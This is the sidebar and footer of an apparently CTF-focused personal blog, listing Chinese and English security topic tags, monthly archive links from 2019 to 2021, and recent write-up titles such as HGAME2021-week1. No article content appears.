rel="tag">伪加密</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag">信息收集</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/" rel="tag">内存取证</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BC%B9shell/" rel="tag">反弹shell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8F%90%E6%9D%83/" rel="tag">提权</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%97%A0%E5%8F%82%E6%95%B0RCE/" rel="tag">无参数RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB/" rel="tag">明文攻击</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">标签云</h3>
    <div class="widget tagcloud">
      <a href="/tags/Crypto/" style="font-size: 10px;">Crypto</a> <a href="/tags/Git%E6%B3%84%E9%9C%B2/" style="font-size: 10px;">Git泄露</a> <a href="/tags/MISC/" style="font-size: 10px;">MISC</a> <a href="/tags/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/" style="font-size: 10px;">OOB带外攻击</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 16.67px;">SQL注入</a> <a href="/tags/SSRF/" style="font-size: 10px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 10px;">SSTI</a> <a href="/tags/XFF/" style="font-size: 13.33px;">XFF</a> <a href="/tags/XPath%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">XPath注入</a> <a href="/tags/XXE/" style="font-size: 13.33px;">XXE</a> <a href="/tags/ctf-whale/" style="font-size: 10px;">ctf-whale</a> <a href="/tags/ctfd/" style="font-size: 10px;">ctfd</a> <a href="/tags/docker/" style="font-size: 10px;">docker</a> <a href="/tags/md5/" style="font-size: 10px;">md5</a> <a href="/tags/netcat/" style="font-size: 10px;">netcat</a> <a href="/tags/pgsql/" style="font-size: 10px;">pgsql</a> <a href="/tags/%E4%BC%AA%E5%8A%A0%E5%AF%86/" style="font-size: 10px;">伪加密</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" style="font-size: 13.33px;">信息收集</a> <a href="/tags/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/" style="font-size: 10px;">内存取证</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 20px;">反序列化</a> <a href="/tags/%E5%8F%8D%E5%BC%B9shell/" style="font-size: 10px;">反弹shell</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 10px;">命令执行</a> <a href="/tags/%E6%8F%90%E6%9D%83/" style="font-size: 10px;">提权</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 13.33px;">文件上传</a> <a href="/tags/%E6%97%A0%E5%8F%82%E6%95%B0RCE/" style="font-size: 10px;">无参数RCE</a> <a href="/tags/%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB/" style="font-size: 13.33px;">明文攻击</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">归档</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">二月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">一月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">十二月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">十一月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">十月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">九月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">十二月 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">最新文章</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/article/hgame2021week1/">HGAME2021-week1</a>
          </li>
        
          <li>
            <a href="/article/2021gongcesai/">CnHongKe2021公测赛</a>
          </li>
        
          <li>
            <a href="/article/cqb2021/">春秋杯2021新春欢乐赛一道题——按F注入 对pgsql的研究</a>
          </li>
        
          <li>
            <a href="/article/djbctf2021/">DJBCTF2021</a>
          </li>
        
          <li>
            <a href="/article/2021/">2021</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2021 gyy<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div><!-- hexo-inject:begin --><!-- hexo-inject:end -->
</body>
</html>